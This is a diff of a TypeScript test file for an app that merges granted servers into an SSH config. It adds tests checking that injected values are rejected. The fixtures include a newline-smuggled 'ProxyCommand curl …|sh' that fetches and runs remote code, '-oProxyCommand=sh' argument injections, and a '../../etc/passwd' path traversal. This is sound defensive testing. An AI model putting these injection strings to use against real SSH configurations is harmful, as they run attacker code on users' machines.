@@ -4,15 +4,6 @@ import { grantOpens, grantPending, grantWithdrawn } from "@shared/servers";
 import { mergeFleet } from "../fleet-run";
 import { appSshPaths, renderSshConfig, sshArgs } from "../ssh-config";
 
-/**
- * The platform's list, merged into the one the app keeps.
- *
- * What these prove: a member who was given a server
- * never types an address and never makes a key. The address comes from
- * `GET /me/servers`, the key is the one this computer registered as a device,
- * and the merge is what puts the two together.
- */
-
 const DEVICE_KEY = "/data/keys/device";
 
 const PATHS = appSshPaths("/data", "/home/jean");
@@ -23,7 +14,7 @@ const GRANTED: FleetServer = {
   id: "srv-platform-1",
   keyReady: true,
   name: "vps-atelier",
-  organization: { id: "org-1", name: "Flymate" },
+  organization: { id: "org-1", name: "Flyleaf" },
   port: 22,
   status: "active",
   user: "dev",
@@ -246,12 +237,6 @@ describe("la révocation", () => {
   });
 });
 
-/**
- * What this section proves: a server removed here stays removed, and a
- * re-enrolled server stays a single server. Both were the same fault seen from
- * two sides — the merge had no memory of a removal, and it bound an entry to an
- * id that re-enrollment had just made stale.
- */
 describe("le retrait sur cet ordinateur", () => {
   it("ne réadopte pas un serveur attribué qu'on avait retiré", () => {
     const merged = merge([], [GRANTED], null, ["srv-platform-1"]);
@@ -366,5 +351,54 @@ describe("la fusion", () => {
     };
 
     expect(merge([system], [GRANTED]).config.servers[0]).toEqual(system);
+  });
+});
+
+describe("une attribution qui porterait une directive SSH", () => {
+  const INJECTION = "x\nProxyCommand curl a.bc|sh";
+
+  const UNFIT: FleetServer[] = [
+    { ...GRANTED, user: INJECTION },
+    { ...GRANTED, user: "-oProxyCommand=sh" },
+    { ...GRANTED, host: INJECTION },
+    { ...GRANTED, host: "-oProxyCommand=sh" },
+    { ...GRANTED, id: `srv${INJECTION}` },
+    { ...GRANTED, id: "../../etc/passwd" },
+    { ...GRANTED, port: 0 },
+    { ...GRANTED, hostFingerprint: `SHA256:abc${INJECTION}` },
+  ];
+
+  it("n'entre jamais dans la liste", () => {
+    for (const granted of UNFIT) {
+      const merged = merge([], [granted]);
+
+      expect(merged.adopted).toEqual([]);
+      expect(merged.config.servers).toEqual([]);
+    }
+  });
+
+  it("laisse à un serveur déjà adopté l'adresse et le compte qu'il avait", () => {
+    const [adopted] = merge([], [GRANTED]).config.servers;
+
+    for (const granted of UNFIT.filter((unfit) => unfit.id === GRANTED.id)) {
+      const [kept] = merge([adopted], [granted]).config.servers;
+
+      expect(kept?.host).toBe("203.0.113.10");
+      expect(kept?.user).toBe(GRANTED.user);
+      expect(kept?.port).toBe(GRANTED.port);
+      expect(kept?.hostFingerprint).toBe("SHA256:atelier");
+      expect(
+        renderSshConfig(merge([adopted], [granted]).config.servers, PATHS)
+      ).not.toContain("ProxyCommand");
+    }
+  });
+
+  it("ne prête pas son empreinte à un serveur tapé ici", () => {
+    const [kept] = merge(
+      [TYPED],
+      [{ ...GRANTED, hostFingerprint: `SHA256:abc${INJECTION}` }]
+    ).config.servers;
+
+    expect(kept?.hostFingerprint).toBeUndefined();
   });
 });
